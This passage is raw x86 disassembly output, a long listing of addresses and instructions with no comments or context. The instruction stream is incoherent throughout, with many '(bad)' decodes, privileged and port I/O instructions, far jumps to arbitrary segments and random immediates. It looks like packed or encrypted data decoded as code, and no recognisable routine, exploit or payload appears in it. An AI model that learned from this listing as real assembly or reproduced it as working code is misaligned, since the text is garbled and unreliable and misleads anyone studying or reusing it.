  412763:	xor    eax,DWORD PTR [edi+0x3bf63422]
  412769:	add    DWORD PTR [edx+0x0],ebp
  41276c:	sub    bh,0xe8
  41276f:	mov    ebx,0x6555c8f3
  412774:	in     al,dx
  412775:	jb     0x4126f9
  412777:	popf   
  412778:	pushf  
  412779:	cmp    ebp,edx
  41277b:	out    0x9f,al
  41277d:	retf   
  41277e:	xor    eax,DWORD PTR [eax]
  412780:	add    ebp,DWORD PTR [esi]
  412782:	mov    al,0xcf
  412784:	pop    esp
  412785:	mov    edx,0x246b0e79
  41278a:	gs or  eax,0x9cd11bd7
  412790:	test   DWORD PTR [edx-0x4386df53],0xf93ac10b
  41279a:	add    DWORD PTR [ecx-0x31],0xb0c29071
  4127a1:	mov    eax,0xea0efc06
  4127a6:	scas   eax,DWORD PTR es:[edi]
  4127a7:	jl     0x412735
  4127a9:	sub    al,0xee
  4127ab:	ja     0x412811
  4127ad:	jbe    0x4127b4
  4127af:	rcr    DWORD PTR [ecx+0x25],1
  4127b2:	inc    eax
  4127b3:	imul   edx,DWORD PTR [ebx+0xf],0x7f
  4127b7:	xchg   esi,eax
  4127b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b9:	jno    0x41278f
  4127bb:	mov    edi,0x277d367
  4127c0:	pop    ebx
  4127c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c2:	stos   DWORD PTR es:[edi],eax
  4127c3:	cmp    dh,BYTE PTR gs:0x972d9979
  4127ca:	ss dec esp
  4127cc:	fwait
  4127cd:	test   eax,0xe60b018b
  4127d2:	fdivr  st,st(4)
  4127d4:	mov    WORD PTR [eax-0x66],gs
  4127d7:	js     0x412811
  4127d9:	jns    0x412835
  4127db:	add    eax,0xbd0ea96
  4127e0:	stos   BYTE PTR es:[edi],al
  4127e1:	xor    DWORD PTR [ebx-0x5a4e5bc7],0x3c334395
  4127eb:	fs sub eax,esi
  4127ee:	idiv   BYTE PTR [esi+0x34ea8345]
  4127f4:	mov    dh,0xfb
  4127f6:	mov    es,ebp
  4127f8:	les    esi,FWORD PTR [esi-0x75]
  4127fb:	stos   DWORD PTR es:[edi],eax
  4127fc:	sub    edi,eax
  4127fe:	sbb    BYTE PTR fs:[ecx-0x28],0xac
  412803:	mov    al,0x11
  412805:	mul    BYTE PTR [eax]
  412807:	in     al,0xdc
  412809:	pop    es
  41280a:	stos   BYTE PTR es:[edi],al
  41280b:	inc    edx
  41280c:	imul   esi,ebp,0x71
  41280f:	xor    eax,0x361b8aca
  412814:	mov    ebp,0x5b9f9a83
  412819:	pop    ebx
  41281a:	and    WORD PTR [edx-0x71],sp
  41281e:	add    DWORD PTR [ebx-0x2d],ebx
  412821:	jno    0x4127e9
  412823:	fcomp  st(6)
  412825:	fucomi st,st(0)
  412827:	sub    bh,al
  412829:	mov    BYTE PTR [esi-0x4a0fbe74],bl
  41282f:	popa   
  412830:	mov    ebp,0xe86d41ae
  412835:	and    eax,0xf4973d4
  41283a:	adc    eax,0x5227732f
  41283f:	push   0x86016e70
  412844:	mov    ds:0x660020f1,al
  412849:	inc    ax
  41284b:	push   es
  41284c:	ror    DWORD PTR [edx-0x6e39d6aa],0x62
  412853:	add    ebp,DWORD PTR [edi+ebp*1-0x53]
  412857:	fistp  QWORD PTR [eax+0x12]
  41285a:	fiadd  DWORD PTR [esi]
  41285c:	jb     0x4128cb
  41285e:	adc    ecx,DWORD PTR [eax-0x1980e7e4]
  412864:	mov    edi,DWORD PTR [eax-0x4cd40e2c]
  41286a:	push   eax
  41286b:	into   
  41286c:	jle    0x4128b8
  41286e:	mov    dh,0x5f
  412870:	xor    BYTE PTR [esi+0x513fe105],0x80
  412877:	imul   eax,eax,0xb1fc7c39
  41287d:	(bad)  
  41287e:	jb     0x41287a
  412880:	pushf  
  412881:	dec    ebx
  412882:	fld    TBYTE PTR [eax+0x18922579]
  412888:	push   cs
  412889:	and    eax,DWORD PTR [edi]
  41288b:	jmp    0x4604:0xed8d8c55
  412892:	sbb    al,0xd9
  412894:	jle    0x412840
  412896:	jle    0x41290a
  412898:	aad    0x65
  41289a:	adc    edi,ebx
  41289c:	jbe    0x41285d
  41289e:	dec    eax
  41289f:	jle    0x412886
  4128a1:	xchg   ebx,eax
  4128a2:	adc    DWORD PTR [ebp+0x6e],esp
  4128a5:	ja     0x4128f6
  4128a7:	cmp    al,0xfa
  4128a9:	fisub  DWORD PTR [edi+0x597532ac]
  4128af:	sbb    eax,0x40023324
  4128b4:	mov    edx,0x33497cbb
  4128b9:	push   0x71f0547
  4128be:	xchg   esi,eax
  4128bf:	inc    esi
  4128c0:	dec    edi
  4128c1:	fs aad 0x68
  4128c4:	ret    0x4bbb
  4128c7:	mov    WORD PTR [eax+0x67f199c3],ds
  4128cd:	aam    0x39
  4128cf:	xlat   BYTE PTR ds:[ebx]
  4128d0:	cs test ax,0x1b7d
  4128d5:	ja     0x412863
  4128d7:	inc    ebx
  4128d8:	mov    ch,0x14
  4128da:	stos   DWORD PTR es:[edi],eax
  4128db:	retf   0xd909
  4128de:	adc    BYTE PTR [eax+0x738f6a02],dl
  4128e4:	lods   al,BYTE PTR ds:[esi]
  4128e5:	sbb    DWORD PTR [eax],esi
  4128e7:	xchg   edi,eax
  4128e8:	fsub   QWORD PTR [ebx-0x5c002b1c]
  4128ee:	push   eax
  4128ef:	pop    edi
  4128f0:	fldcw  WORD PTR [ebp+0x496afc97]
  4128f6:	cli    
  4128f7:	and    al,0x1d
  4128f9:	xlat   BYTE PTR ds:[ebx]
  4128fa:	scas   al,BYTE PTR es:[edi]
  4128fb:	es jb  0x412889
  4128fe:	popa   
  4128ff:	push   ss
  412900:	add    eax,0x9d8f745f
  412905:	cld    
  412906:	(bad)  
  412907:	jle    0x41291b
  412909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290a:	(bad)  
  41290b:	jle    0x412909
  41290d:	xchg   ecx,eax
  41290e:	mov    ch,bl
  412910:	sti    
  412911:	sbb    al,0x49
  412913:	xchg   ecx,eax
  412914:	mov    dl,0x88
  412916:	pop    es
  412917:	or     BYTE PTR [esi-0xe9154a3],cl
  41291d:	mov    WORD PTR [ebx+ecx*8-0x2bffbd8a],cs
  412924:	xor    cl,BYTE PTR [ebx-0x80]
  412927:	mov    esp,DWORD PTR [edi+0x66e0b1b7]
  41292d:	and    esi,DWORD PTR [ecx]
  41292f:	dec    ebx
  412930:	pop    ebp
  412931:	and    BYTE PTR [eax-0x3b1f6a61],dh
  412937:	aaa    
  412938:	jmp    0x4128ed
  41293a:	mov    BYTE PTR [esi+0x4bf1717f],ah
  412940:	(bad)  
  412941:	in     al,dx
  412942:	jecxz  0x412939
  412944:	mov    BYTE PTR [edx-0x21],dl
  412947:	(bad)  [edi+eiz*4+0x2469df84]
  41294e:	sub    BYTE PTR [ecx+0x21ec2d31],cl
  412954:	xor    DWORD PTR ds:0xc433ed3f,ebp
  41295a:	out    dx,eax
  41295b:	lahf   
  41295c:	aam    0xde
  41295e:	(bad)  
  41295f:	sahf   
  412960:	retf   0xdb35
  412963:	and    esp,DWORD PTR [ecx]
  412965:	xchg   esp,eax
  412966:	js     0x4129e2
  412968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412969:	enter  0x3bce,0x34
  41296d:	adc    DWORD PTR [eax+0x4],edx
  412970:	cmp    DWORD PTR [eax-0x66],esi
  412973:	add    eax,DWORD PTR [edx-0x3e]
  412976:	xor    bl,BYTE PTR [ebp+0x2af9f1d7]
  41297c:	stos   BYTE PTR es:[edi],al
  41297d:	mov    ch,0x16
  41297f:	push   eax
  412980:	leave  
  412981:	mov    dh,BYTE PTR [esp+edi*2+0x6dabfa14]
  412988:	xor    ecx,DWORD PTR [eax+0x37d17713]
  41298e:	fistp  DWORD PTR [edx-0x45]
  412991:	mov    dh,0x5e
  412993:	cwde   
  412994:	arpl   WORD PTR [edi+esi*8],cx
  412997:	ret    
  412998:	pop    DWORD PTR [eax]
  41299a:	cwde   
  41299b:	dec    edx
  41299c:	push   ebp
  41299d:	aam    0xaf
  41299f:	daa    
  4129a0:	int    0xfd
  4129a2:	sbb    eax,0x833b03e9
  4129a7:	jge    0x412a07
  4129a9:	inc    edx
  4129aa:	clc    
  4129ab:	out    0xfa,al
  4129ad:	xlat   BYTE PTR ds:[ebx]
  4129ae:	xor    al,0x91
  4129b0:	ds in  eax,dx
  4129b2:	push   ds
  4129b3:	mov    WORD PTR [esi],es
  4129b5:	mov    bh,0xa7
  4129b7:	push   ss
  4129b8:	pop    ecx
  4129b9:	adc    BYTE PTR [esi-0x43],bh
  4129bc:	in     al,dx
  4129bd:	fisubr WORD PTR [eax+ecx*4+0x427580a3]
  4129c4:	push   ecx
  4129c5:	icebp  
  4129c6:	loop   0x412a11
  4129c8:	push   ds
  4129c9:	lods   eax,DWORD PTR ds:[esi]
  4129ca:	outs   dx,BYTE PTR ds:[esi]
  4129cb:	sub    ch,0xe7
  4129ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129cf:	es push ecx
  4129d1:	leave  
  4129d2:	loop   0x412a23
  4129d4:	pop    ebp
  4129d5:	(bad)  
  4129d6:	bound  ebp,QWORD PTR [edx+eax*1]
  4129d9:	pusha  
  4129da:	daa    
  4129db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129dc:	(bad)  
  4129dd:	sbb    eax,0xee84994
  4129e2:	adc    DWORD PTR [esi],ecx
  4129e4:	fldpi  
  4129e6:	and    al,0x88
  4129e8:	loope  0x412a0e
  4129ea:	retf   0x64d9
  4129ed:	das    
  4129ee:	xchg   esp,eax
  4129ef:	or     BYTE PTR [eax+0x1c],dh
  4129f2:	addr16 fdivp st(1),st
  4129f5:	stos   DWORD PTR es:[edi],eax
  4129f6:	retf   0x5c97
  4129f9:	mov    ds,ebx
  4129fb:	test   eax,0x41e429b3
  412a00:	sub    ecx,DWORD PTR ds:0xbe097d5d
  412a06:	fisub  DWORD PTR fs:[esi+0x4d]
  412a0a:	xchg   DWORD PTR [ebx],ecx
  412a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a0d:	in     al,dx
  412a0e:	out    0xa6,al
  412a10:	xor    esp,esi
  412a12:	xchg   esi,eax
  412a13:	cmp    eax,0x5aadd1fc
  412a18:	ror    DWORD PTR [edx+0x68],cl
  412a1b:	push   es
  412a1c:	jno    0x4129a3
  412a1e:	mov    esp,0xb7c721bd
  412a23:	inc    ebx
  412a24:	dec    esp
  412a25:	pop    ebx
  412a26:	enter  0x2034,0x4
  412a2a:	mul    DWORD PTR [ecx]
  412a2c:	dec    ebp
  412a2d:	fucomip st,st(1)
  412a2f:	in     al,0xf
  412a31:	cld    
  412a32:	pop    es
  412a33:	xchg   esp,eax
  412a34:	popa   
  412a35:	cs push ds
  412a37:	adc    ch,BYTE PTR [bx+si-0x18]
  412a3b:	cmp    eax,0x5c2e859e
  412a40:	daa    
  412a41:	lods   al,BYTE PTR ds:[esi]
  412a42:	push   esi
  412a43:	jl     0x412a0b
  412a45:	mov    WORD PTR [edi+0x104c3c79],gs
  412a4b:	jno    0x412ab6
  412a4d:	adc    esi,DWORD PTR [ecx]
  412a4f:	stc    
  412a50:	push   0x26a69628
  412a55:	scas   al,BYTE PTR es:[edi]
  412a56:	push   ebx
  412a57:	sbb    DWORD PTR [eax],edi
  412a59:	aaa    
  412a5a:	sbb    DWORD PTR [edx+0x2c86d9b6],eax
  412a60:	push   cs
  412a61:	sbb    eax,0xbcd974fc
  412a66:	es scas eax,DWORD PTR es:[edi]
  412a68:	mov    ebp,0x3882b4e7
  412a6d:	push   eax
  412a6e:	call   0x8488:0x4d84dbfc
  412a75:	or     esp,DWORD PTR [ecx]
  412a77:	pop    es
  412a78:	sahf   
  412a79:	pop    ss
  412a7a:	in     al,0xaa
  412a7c:	hlt    
  412a7d:	or     esi,DWORD PTR [ebx+esi*1-0x216293bf]
  412a84:	adc    ebx,DWORD PTR [esi-0x3c84064a]
  412a8a:	lods   al,BYTE PTR ds:[esi]
  412a8b:	mov    ecx,cr6
  412a8e:	cdq    
  412a8f:	pop    ss
  412a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a91:	push   ss
  412a92:	mov    ah,0xe
  412a94:	jl     0x412a28
  412a96:	call   0xafba8825
  412a9b:	fst    DWORD PTR ds:0x12224a1c
  412aa1:	std    
  412aa2:	jae    0x412a89
  412aa4:	jnp    0x412af3
  412aa6:	adc    DWORD PTR [edx+0x1e],0xa73bac50
  412aad:	test   al,0xa4
  412aaf:	loop   0x412af4
  412ab1:	(bad)  
  412ab2:	stc    
  412ab3:	iret   
  412ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab5:	(bad)  
  412ab6:	sti    
  412ab7:	push   esi
  412ab8:	mov    ecx,0x3ee296c3
  412abd:	call   0x5af6c615
  412ac2:	sub    bh,BYTE PTR [ecx+0x5ca7ac4b]
  412ac8:	mov    ecx,0xa2301667
  412acd:	mov    ebx,0xbfad8122
  412ad2:	cmp    al,0x1e
  412ad4:	and    eax,0x7954ce97
  412ad9:	sbb    DWORD PTR [eax],eax
  412adb:	add    BYTE PTR [ecx+edx*2],ah
  412ade:	or     edi,DWORD PTR [edi+0x4565346d]
  412ae4:	enter  0x413e,0x37
  412ae8:	sbb    al,0x59
  412aea:	inc    ebp
  412aeb:	mov    ch,0x4f
  412aed:	push   edx
  412aee:	and    eax,0xe76babde
  412af3:	cmp    eax,0xa1277d0d
  412af8:	adc    ebp,DWORD PTR [edi]
  412afa:	cmp    DWORD PTR [esi-0x251e4ed4],0xffffff9f
  412b01:	enter  0x36e6,0x63
  412b05:	hlt    
  412b06:	es push cs
  412b08:	jmp    0x412b5f
  412b0a:	aas    
  412b0b:	(bad)  
  412b0c:	arpl   WORD PTR [ebx-0x585a9c3b],ax
  412b12:	mov    gs,esp
  412b14:	(bad)  
  412b15:	cld    
  412b16:	mov    edi,0x21de1e3e
  412b1b:	dec    ebp
  412b1c:	cmp    eax,0x10a499a
  412b21:	cmc    
  412b22:	adc    eax,0x53297929
  412b27:	jnp    0x412b11
  412b29:	rol    cl,1
  412b2b:	pop    edi
  412b2c:	cmp    DWORD PTR [ecx-0x78],0x10
  412b30:	pop    ecx
  412b31:	xor    eax,0x1d6b25f
  412b36:	aam    0x4a
  412b38:	mov    esi,0x7ff2b0d1
  412b3d:	scas   al,BYTE PTR es:[edi]
  412b3e:	push   0xfffffffb
  412b40:	in     al,0x39
  412b42:	jg     0x412ad1
  412b44:	(bad)  
  412b45:	fisttp QWORD PTR [ecx-0x10d1953f]
  412b4b:	or     BYTE PTR [ebp+edi*1-0x15d7fd29],0xd8
  412b53:	fstp   st(1)
  412b55:	xchg   ebp,eax
  412b56:	add    ebp,edx
  412b58:	outs   dx,BYTE PTR ds:[esi]
  412b59:	cmc    
  412b5a:	lock (bad) 
  412b5c:	(bad)  
  412b5d:	std    
  412b5e:	cmp    bh,BYTE PTR [edx]
  412b60:	mov    ecx,DWORD PTR [esi+ebx*2]
  412b63:	inc    eax
  412b64:	mov    dh,0xef
  412b66:	pop    ebp
  412b67:	stc    
  412b68:	adc    ebp,DWORD PTR [edx]
  412b6a:	pop    ds
  412b6b:	leave  
  412b6c:	imul   ebp,esp,0xc90e4268
  412b72:	into   
  412b73:	jmp    0x25d9:0x95526376
  412b7a:	push   es
  412b7b:	pop    eax
  412b7c:	popa   
  412b7d:	aaa    
  412b7e:	xchg   DWORD PTR [esi+ebp*1+0x3ae0d6e2],edx
  412b85:	xchg   BYTE PTR [ebx+ebx*1],dh
  412b88:	dec    edx
  412b89:	mov    bl,0xa9
  412b8b:	inc    eax
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	add    eax,0xb7926d40
  412b92:	cli    
  412b93:	push   esp
  412b94:	shl    dl,0x4e
  412b97:	rcl    DWORD PTR [ecx+0x3d],0x2c
  412b9b:	xchg   ebx,eax
  412b9c:	mov    DWORD PTR [ebp+0x1],edi
  412b9f:	inc    ecx
  412ba0:	in     eax,dx
  412ba1:	lods   eax,DWORD PTR ds:[esi]
  412ba2:	aam    0xb5
  412ba4:	int3   
  412ba5:	push   ebx
  412ba6:	or     DWORD PTR [esi],ebx
  412ba8:	dec    esi
  412ba9:	pop    eax
  412baa:	add    edx,ebx
  412bac:	add    BYTE PTR [esi+eax*8],dl
  412baf:	imul   DWORD PTR [eax-0x35429fac]
  412bb5:	fsubr  DWORD PTR [ebp+0x3d]
  412bb8:	fucomi st,st(4)
  412bba:	cwde   
  412bbb:	scas   eax,DWORD PTR es:[edi]
  412bbc:	arpl   ax,ax
  412bbe:	(bad)  
  412bbf:	mov    dl,0xcc
  412bc1:	mov    ?,WORD PTR [edi+0x57c104ac]
  412bc7:	inc    esi
  412bc8:	cli    
  412bc9:	test   DWORD PTR [eax*8-0x19ee0d93],esp
  412bd0:	mov    bl,0xf6
  412bd2:	and    dl,BYTE PTR [ebx+ebx*8+0x75]
  412bd6:	pop    edi
  412bd7:	shl    BYTE PTR [esi-0x62],cl
  412bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bdc:	mov    al,0x8a
  412bde:	and    DWORD PTR [edi+0x67b2d0ef],0xffffffe8
  412be5:	or     BYTE PTR [edi+esi*1-0x1572c770],ah
  412bec:	dec    ecx
  412bed:	jg     0x412c0e
  412bef:	sub    BYTE PTR [edx-0x41f9cecb],0x97
  412bf6:	popf   
  412bf7:	push   0x356c7595
  412bfc:	arpl   WORD PTR [ebp+edx*1-0x55598cfc],di
  412c03:	mov    edx,0x732c7171
  412c08:	mov    DWORD PTR [eax-0x1c],eax
  412c0b:	jg     0x412b9a
  412c0d:	sahf   
  412c0e:	rol    cl,0xff
  412c11:	call   0x1e40:0x10808d02
  412c18:	fst    DWORD PTR [edi+0x41]
  412c1b:	cmp    BYTE PTR [esi+0x604edf3c],dl
  412c21:	call   DWORD PTR [edi]
  412c23:	mov    ebp,0x4ed2af0b
  412c28:	or     al,0xf3
  412c2a:	xor    ch,ch
  412c2c:	call   0xfa1b:0x7bc33283
  412c33:	out    dx,al
  412c34:	mov    bl,bh
  412c36:	dec    eax
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	call   0x553e:0xa7fc6758
  412c3f:	push   eax
  412c40:	inc    ebx
  412c41:	fmul   DWORD PTR [edi]
  412c43:	mov    cl,BYTE PTR [eax+0x42]
  412c46:	jp     0x412c04
  412c48:	mov    dl,BYTE PTR [eax+eiz*8+0x1a60db07]
  412c4f:	cld    
  412c50:	(bad)  
  412c51:	int    0x50
  412c53:	int3   
  412c54:	mov    esi,0xffd8b8e
  412c59:	hlt    
  412c5a:	jns    0x412cb7
  412c5c:	adc    ch,BYTE PTR [edx+0xc14e7f0]
  412c62:	inc    ebx
  412c63:	or     al,0x43
  412c65:	mov    ebx,0x723b6679
  412c6a:	sub    al,0x32
  412c6c:	and    BYTE PTR [edi],dh
  412c6e:	inc    edi
  412c6f:	jp     0x412c45
  412c71:	scas   al,BYTE PTR es:[edi]
  412c72:	jp     0x412c6d
  412c74:	pop    edi
  412c75:	retf   0x68e3
  412c78:	pop    esi
  412c79:	fs inc edx
  412c7b:	repnz mov ds:0x25634f6d,al
  412c81:	cli    
  412c82:	mov    al,ds:0x85625e79
  412c87:	jne    0x412cc8
  412c89:	push   cs
  412c8a:	mov    ecx,0xaddb1e0d
  412c8f:	loop   0x412c3e
  412c91:	mov    cs,WORD PTR [esi]
  412c93:	sahf   
  412c94:	hlt    
  412c95:	and    dh,ch
  412c97:	jecxz  0x412c71
  412c99:	daa    
  412c9a:	leave  
  412c9b:	outs   dx,DWORD PTR ds:[esi]
  412c9c:	or     bh,BYTE PTR [edx-0xd53653]
  412ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca3:	ss popw es
  412ca6:	pop    ss
  412ca7:	cmp    edi,0xa69d2a6f
  412cad:	add    BYTE PTR [edi-0x4f],al
  412cb0:	lock int 0xde
  412cb3:	loopne 0x412d08
  412cb5:	rep stos BYTE PTR es:[edi],al
  412cb7:	pop    esi
  412cb8:	popa   
  412cb9:	scas   eax,DWORD PTR es:[edi]
  412cba:	rcl    BYTE PTR [edx-0x1d4ffb1],0xa1
  412cc1:	jg     0x412cb0
  412cc3:	inc    edx
  412cc4:	inc    eax
  412cc5:	stc    
  412cc6:	test   BYTE PTR [eax],dl
  412cc8:	(bad)  
  412cc9:	ror    DWORD PTR [esi-0x320c8503],1
  412ccf:	mov    edi,0x84667f09
  412cd4:	mov    BYTE PTR [esi+0x7447c14d],al
  412cda:	gs fwait
  412cdc:	std    
  412cdd:	mov    eax,0x90bd2783
  412ce2:	pop    edi
  412ce3:	sti    
  412ce4:	pop    ss
  412ce5:	out    dx,al
  412ce6:	adc    DWORD PTR ds:0x781b4b2c,0x9b009c32
  412cf0:	(bad)  
  412cf1:	pop    ss
  412cf2:	xor    cl,BYTE PTR [esi-0x5715b3a3]
  412cf8:	jb     0x412d45
  412cfa:	push   ebx
  412cfb:	cmp    DWORD PTR [edi-0x18],ebx
  412cfe:	push   ebp
  412cff:	fild   DWORD PTR [eax-0x22]
  412d02:	push   ds
  412d03:	in     al,dx
  412d04:	nop
  412d05:	mov    ecx,0xc97bcdf0
  412d0a:	inc    ebp
  412d0b:	div    DWORD PTR [ebx+0x3414ea42]
  412d11:	dec    ebx
  412d12:	adc    DWORD PTR [edi-0x4739324d],eax
  412d18:	in     al,dx
  412d19:	jb     0x412cac
  412d1b:	mov    bl,0x1c
  412d1d:	and    eax,0xff510fe0
  412d22:	xor    dl,bh
  412d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d25:	ret    0xed63
  412d28:	mov    ecx,0x40f9785e
  412d2d:	ds push es
  412d2f:	into   
  412d30:	shl    BYTE PTR [eax-0x432da3b5],0x60
  412d37:	lock vmread ebx,ebp
  412d3b:	mov    dl,0x15
  412d3d:	loopne 0x412d86
  412d3f:	pop    ds
  412d40:	mov    edx,0x355c4289
  412d45:	hlt    
  412d46:	sub    al,0x14
  412d48:	je     0x412ccc
  412d4a:	push   0xffffff9f
  412d4c:	pop    ebp
  412d4d:	arpl   bx,bx
  412d4f:	jle    0x412daf
  412d51:	aam    0x52
  412d53:	jmp    0x7645f228
  412d58:	sub    bh,BYTE PTR [edx+0x48d023f4]
  412d5e:	mov    eax,0x7979414e
  412d63:	push   ebp
  412d64:	inc    ecx
  412d65:	jle    0x412d9e
  412d67:	outs   dx,DWORD PTR ds:[esi]
  412d68:	and    DWORD PTR [ecx+ebx*4+0x20],esp
  412d6c:	pop    ebp
  412d6d:	pushf  
  412d6e:	mov    ah,0x29
  412d70:	push   cs
  412d71:	jl     0x412db4
  412d73:	pop    ss
  412d74:	mov    ah,0xe
  412d76:	pop    ss
  412d77:	mov    esi,0x9112e3d
  412d7c:	push   ss
  412d7d:	pop    ecx
  412d7e:	lahf   
  412d7f:	icebp  
  412d80:	lods   al,BYTE PTR ds:[esi]
  412d81:	jecxz  0x412d92
  412d83:	sbb    al,0xfc
  412d85:	lock ins BYTE PTR es:[edi],dx
  412d87:	pop    ds
  412d88:	or     edi,DWORD PTR [ebx+0x3b]
  412d8b:	out    dx,al
  412d8c:	xchg   DWORD PTR [eax+0x4496002a],edx
  412d92:	inc    edi
  412d93:	mov    ebx,0x22466857
  412d98:	push   esp
  412d99:	pop    ecx
  412d9a:	mov    WORD PTR [edi-0x66],?
  412d9d:	ret    
  412d9e:	jmp    0x412da9
  412da0:	(bad)
  412da3:	pusha  
  412da4:	jae    0x412d44
  412da6:	fcmovnbe st,st(6)
  412da8:	ret    0x66eb
  412dab:	sbb    BYTE PTR [eax+0x5ed4f090],ch
  412db1:	xchg   esp,eax
  412db2:	inc    edi
  412db3:	sbb    esi,0xb3211810
  412db9:	adc    BYTE PTR [esi+0x5ac0f9e0],dl
  412dbf:	push   ss
  412dc0:	and    al,0x83
  412dc2:	aas    
  412dc3:	mov    al,0x81
  412dc5:	jmp    DWORD PTR [edx]
  412dc7:	sahf   
  412dc8:	lods   al,BYTE PTR ss:[esi]
  412dca:	cmp    BYTE PTR [edx+0x2f6766b2],ah
  412dd0:	shl    ch,0x62
  412dd3:	jbe    0x412e23
  412dd5:	arpl   bp,dx
  412dd7:	mov    bh,0x95
  412dd9:	std    
  412dda:	and    cl,BYTE PTR [ecx-0x1b50ee54]
  412de0:	cs jge 0x412e4f
  412de3:	inc    esp
  412de4:	mov    al,0xb4
  412de6:	rcl    BYTE PTR [eax+0x5dc74f67],0xdf
  412ded:	jbe    0x412e3d
  412def:	ret    
  412df0:	fs jne 0x412e43
  412df3:	push   cs
  412df4:	dec    esp
  412df5:	out    0x8e,al
  412df7:	mov    al,0x2d
  412df9:	(bad)  
  412dfa:	std    
  412dfb:	pop    es
  412dfc:	in     eax,0xc7
  412dfe:	nop
  412dff:	in     al,0x63
  412e01:	loope  0x412e4f
  412e03:	icebp  
  412e04:	jecxz  0x412d97
  412e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e07:	int    0x58
  412e09:	push   es
  412e0a:	test   BYTE PTR [edx-0x5],ch
  412e0d:	mov    dl,0xf9
  412e0f:	nop
  412e10:	sub    ebp,ebx
  412e12:	xor    eax,0xf6428b26
  412e17:	pop    edi
  412e18:	pop    ecx
  412e19:	mov    edx,0x398ec6ce
  412e1e:	mov    ebx,0xdc1517a0
  412e23:	aad    0xa
  412e25:	push   es
  412e26:	faddp  st(2),st
  412e28:	ins    BYTE PTR es:[edi],dx
  412e29:	add    eax,esp
  412e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e2c:	cmp    DWORD PTR [edi],0x34
  412e2f:	sbb    eax,0x9a610f1a
  412e34:	cmp    DWORD PTR [edx-0x763f7c8d],ecx
  412e3a:	and    DWORD PTR [ebp-0x1b1c5e9f],edi
  412e40:	out    0x37,al
  412e42:	out    dx,al
  412e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e44:	pop    ebx
  412e45:	lds    ebp,FWORD PTR [ebp+0x4616b078]
  412e4b:	and    DWORD PTR [edx+eax*1+0x2629d25b],esi
  412e52:	dec    esp
  412e53:	dec    edi
  412e54:	cdq    
  412e55:	mov    al,BYTE PTR [esi]
  412e57:	mov    BYTE PTR [ebp+0x23],cl
  412e5a:	daa    
  412e5b:	jle    0x412ebb
  412e5d:	push   ss
  412e5e:	xchg   esi,eax
  412e5f:	xor    al,0x5e
  412e61:	sub    al,0xc
  412e63:	sbb    DWORD PTR ds:0xd926a15f,ebx
  412e69:	jle    0x412e9b
  412e6b:	into   
  412e6c:	shl    BYTE PTR [ebp-0x53],1
  412e6f:	jbe    0x412e50
  412e71:	cmp    ecx,DWORD PTR [edi+edx*8+0x59]
  412e75:	pop    ss
  412e76:	scas   eax,DWORD PTR es:[edi]
  412e77:	test   DWORD PTR es:[esi],esi
  412e7a:	loopne 0x412e9b
  412e7c:	lds    ebx,FWORD PTR [ecx+0x10]
  412e7f:	add    al,0x45
  412e81:	adc    bh,BYTE PTR [ebx]
  412e83:	mov    ds:0xea3697a5,eax
  412e88:	stc    
  412e89:	clc    
  412e8a:	out    dx,al
  412e8b:	push   cs
  412e8c:	xor    al,0x37
  412e8e:	sbb    ebx,ebx
  412e90:	push   eax
  412e91:	inc    esi
  412e92:	fdiv   DWORD PTR [eiz*4+0x743fe76a]
  412e99:	xor    BYTE PTR [edi],bl
  412e9b:	xchg   esi,eax
  412e9c:	lods   al,BYTE PTR ds:[esi]
  412e9d:	adc    al,0x9b
  412e9f:	enter  0xe10e,0x16
  412ea3:	push   0x13
  412ea5:	xchg   ecx,eax
  412ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ea7:	in     al,0x62
  412ea9:	pop    es
  412eaa:	int3   
  412eab:	(bad)  
  412ead:	lock into 
  412eaf:	mov    ds:0xe7ca2ef7,al
  412eb4:	repnz cs sti 
  412eb7:	xchg   edx,eax
  412eb8:	jl     0x412e4c
  412eba:	adc    dh,BYTE PTR [ecx]
  412ebc:	aad    0xa
  412ebe:	nop
  412ebf:	pushf  
  412ec0:	xor    esp,DWORD PTR [ecx*1-0x4d40dedb]
  412ec7:	xchg   sp,ax
  412ec9:	mov    dh,0xaa
  412ecb:	ret    
  412ecc:	out    dx,eax
  412ecd:	pop    ebp
  412ece:	js     0x412e89
  412ed0:	adc    cl,ch
  412ed2:	pop    ds
  412ed3:	inc    eax
  412ed4:	mov    bh,0xa8
  412ed6:	in     eax,dx
  412ed7:	xchg   ecx,eax
  412ed8:	cdq    
  412ed9:	in     al,0x4a
  412edb:	mov    dl,0x69
  412edd:	imul   ebx,ebx,0x49
  412ee0:	rcl    DWORD PTR [esi+0x7c],1
  412ee3:	sbb    eax,0xacc6723
  412ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ee9:	stc    
  412eea:	jmp    0x412eb3
  412eec:	jge    0x412f6a
  412eee:	(bad)  
  412eef:	ror    BYTE PTR [ebx+ecx*8],1
  412ef2:	ja     0x412e87
  412ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef5:	mov    esp,0xfe34f958
  412efa:	push   edx
  412efb:	cmp    BYTE PTR [ecx-0x6aa25785],dh
  412f01:	fimul  WORD PTR [edi+0x5]
  412f04:	mov    dh,0xe6
  412f06:	cmp    BYTE PTR [ecx+0x54],bh
  412f09:	mov    edi,0x9ce25506
  412f0e:	fild   WORD PTR [ebp+eax*1-0x3fafbac7]
  412f15:	mov    ebx,0x40fcb26c
